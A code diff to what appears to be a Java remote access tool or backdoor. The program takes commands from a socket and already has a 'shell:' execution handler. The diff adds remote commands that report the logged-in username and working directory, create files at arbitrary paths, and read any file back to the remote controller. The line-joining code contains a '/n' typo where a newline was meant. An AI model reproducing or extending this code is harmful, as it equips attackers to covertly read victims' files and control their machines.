@@ -1,7 +1,10 @@
 import java.io.*;
 import java.net.InetAddress;
 import java.net.Socket;
+import java.util.Collection;
+import java.util.Map;
 import java.util.Properties;
+import java.util.Set;
 
 public class Main {
     public static void main(String[] args) {
@@ -51,6 +54,63 @@ public class Main {
                     printWriter.println(stringBuilder.toString());
                     printWriter.flush();
                     continue;
+                }
+                if (message.equals("getlogin")) {
+                    Map<String,String> user = System.getenv();
+                    printWriter.println(" [Login Now] "+user.get("USERNAME"));
+                    printWriter.flush();
+                    continue;
+                }
+                if (message.equals("pwd")) {
+                    printWriter.println(System.getProperty("user.dir"));
+                    printWriter.flush();
+                    continue;
+                }
+                if (message.startsWith("touch ")) {
+                    String create_path = message.substring(6);
+                    File file = new File(create_path);
+                    if (file.createNewFile()) {
+                        printWriter.println("CREATE FILE: "+file.getName()+" OK");
+                        printWriter.flush();
+                        continue;
+                    }
+                    printWriter.println("FAIL TO CREATE FILE: "+file.getName());
+                    printWriter.flush();
+                    continue;
+                }
+                if (message.startsWith("cat ")) {
+                    String cat_path = message.substring(4);
+                    File file = new File(cat_path);
+                    if (!file.exists()) {
+                        printWriter.println("CAN NOT FIND TARGET FILE");
+                        printWriter.flush();
+                        continue;
+                    }
+                    else {
+                        try {
+                            FileReader fileReader = new FileReader(file);
+                            BufferedReader reader = new BufferedReader(fileReader);
+                            StringBuilder stringBuilder = new StringBuilder("");
+
+                            while (true) {
+                                String line = reader.readLine();
+                                if (line == null) {
+                                    break;
+                                }
+                                stringBuilder.append(line);
+                                stringBuilder.append("/n");
+                            }
+                            reader.close();
+                            fileReader.close();
+                            printWriter.println(stringBuilder.toString());
+                            printWriter.flush();
+                            continue;
+                        }catch (Exception exception){
+                            printWriter.println("READ TARGET FILE ERROR");
+                            printWriter.flush();
+                            continue;
+                        }
+                    }
                 }
                 if (message.startsWith("shell:")) {
                     try {
